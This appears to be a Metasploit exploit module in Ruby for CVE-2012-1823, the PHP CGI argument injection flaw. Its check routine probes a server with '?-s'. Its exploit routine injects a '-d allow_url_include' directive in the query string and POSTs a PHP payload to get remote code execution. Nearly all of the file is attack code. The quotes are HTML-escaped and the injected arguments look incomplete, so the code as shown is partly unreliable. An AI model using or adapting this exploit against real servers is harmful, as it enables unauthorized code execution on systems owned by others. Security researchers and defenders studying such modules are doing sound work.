# $Id$
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
load &#039;lib/msf/core/exploit/http/server.rb&#039;
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;PHP CGI Argument Injection&#039;,
            &#039;Description&#039;    => %q{
                When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to
                an argument injection vulnerability.  This module takes advantage of
                the -d flag to set php.ini directives to achieve code execution.
                From the advisory: "if there is NO unescaped &#039;=&#039; in the query string,
                the string is split on &#039;+&#039; (encoded space) characters, urldecoded,
                passed to a function that escapes shell metacharacters (the "encoded in
                a system-defined manner" from the RFC) and then passes them to the CGI
                binary."
            },
            &#039;Author&#039;         => [ &#039;egypt&#039;, &#039;hdm&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision$&#039;,
            &#039;References&#039;     => [
                    [ "CVE" , "2012-1823" ],
                    [ "URL" , "http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;DisableNops&#039; => true,
                    # Arbitrary big number. The payload gets sent as an HTTP
                    # response body, so really it&#039;s unlimited
                    &#039;Space&#039;       => 262144, # 256k
                },
            &#039;DisclosureDate&#039; => &#039;May 03 2012&#039;,
            &#039;Platform&#039;       => &#039;php&#039;,
            &#039;Arch&#039;           => ARCH_PHP,
            &#039;Targets&#039;        => [[ &#039;Automatic&#039;, { }]],
            &#039;DefaultTarget&#039; => 0))
 
        register_options([
            OptString.new(&#039;TARGETURI&#039;, [false, "The URI to request"]),
            ], self.class)
    end
 
    # php-cgi -h
    # ...
    #   -s               Display colour syntax highlighted source.
    def check
        uri = target_uri.path
        if(uri and ! uri.empty?)
            uri.gsub!(/\?.*/, "")
 
            print_status("Checking uri #{uri}")
 
            response = send_request_raw({ &#039;uri&#039; => uri })
 
            if response and response.code == 200 and response.body =~ /\<code\>\<span style.*\&lt\;\?/mi
                print_error("Server responded in a way that was ambiguous, could not determine whether it was vulnerable")
                return Exploit::CheckCode::Unknown
            end
 
            response = send_request_raw({ &#039;uri&#039; => uri + &#039;?-s&#039;})
            if response and response.code == 200 and response.body =~ /\<code\>\<span style.*\&lt\;\?/mi
                return Exploit::CheckCode::Vulnerable
            end
 
            print_error("Server responded indicating it was not vulnerable")
            return Exploit::CheckCode::Safe
        else
            return Exploit::CheckCode::Unknown
        end
    end
 
    def exploit
        #sleep 100
        begin
            php_trues  = [ "1", "on", "true" ]
            php_falses = [ "0", "off", "false" ]
            args = [
                "-d+allow_url_include%3d#{rand_php_ini_true}",
            ]
 
            qs = args.join("+")
            uri = "#{target_uri}?#{qs}"
            p uri
 
            # Has to be all on one line, so gsub out the comments and the newlines
            payload_oneline = "<?php " +payload.encoded.gsub(/\s*#.*$/, "").gsub("\n", "")
            response = send_request_cgi( {
                &#039;method&#039; => "POST",
                &#039;global&#039; => true,
                &#039;uri&#039;    => uri,
                &#039;data&#039;   => payload_oneline,
            }, 0.1)
            handler
 
        rescue ::Interrupt
            raise $!
        rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused
            print_error("The target service unreachable")
        rescue ::OpenSSL::SSL::SSLError
            print_error("The target failed to negotiate SSL, is this really an SSL service?")
        end
    end
 
    def rand_php_ini_false
        [ "0", "off", "false" ].sort_by{rand}.first
    end
 
    def rand_php_ini_true
        [ "1", "on", "true" ].sort_by{rand}.first
    end
 
end



